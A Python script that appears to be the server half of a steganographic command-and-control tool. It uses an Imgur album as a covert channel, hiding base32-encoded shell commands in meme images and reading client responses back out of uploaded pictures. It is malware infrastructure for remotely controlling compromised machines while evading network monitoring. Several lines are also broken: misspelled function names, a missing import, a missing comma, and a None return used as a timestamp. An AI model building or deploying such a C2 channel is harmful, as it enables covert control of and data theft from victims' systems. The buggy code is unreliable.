#!/usr/bin/env python
from imgurpython import ImgurClient
import random, time, ast, base64
import LSB_steganography as LSB

def get_input(string):
    ''' Get input from console regardless of python 2 or 3'''
    try:
        return raw_input(string)
    except:
        return intput(string)

def create_command_message(uid, command):
    command = str(base64.b32encode(command.replace('\n', '')))
    return "{'uuid':'" + uid + "','command':'" + command + "'}"

def send_command_message(uid, client_os, image_url):
    command = get_input(client_os + '@' + uid + '>')
    steg_path = LSB.hide_message(image_url,
                                 create_command_message(uid, command),
                                 'Imgur1.png', True)
    print('Sending command to client...')
    uploaded = client.upload_from_path(steg_path)
    client.album_add_image(a[0].id, uploaded['id'])

    if command == 'quit':
        sys.exit()

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'

    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print('Go to the following URL: {}'.format(authorization_url))
    pin = get_input('Enter pin code: ')

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'],
                         credentials['refresh_token'])
    return client

client = authenticate()
a = client.get_account_albumns('c2imgserver')

imgs = client.get_album_image(a[0].id)
last_message_datetime = imgs[-1].datetime

print('Awaiting client connection...')

loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict = ast.literal_eval(LSB.extract_message(imgs[-1].link, True))
        if client_dict['status'] == 'ready':
            print('Client connected:\n')
            print('Client UUID:' + client_dict['uuid'])
            print('Client OS:' + client_dict['os'])
        else:
            print(base64.b32decode(client_dict['response']))

        random.choice(client.default_memes()).link
        last_message_datetime = send_command_message(client_dict['uuid'],
                                                     client_dict['os']
                                                     random.choice(client.default_memes()).link)
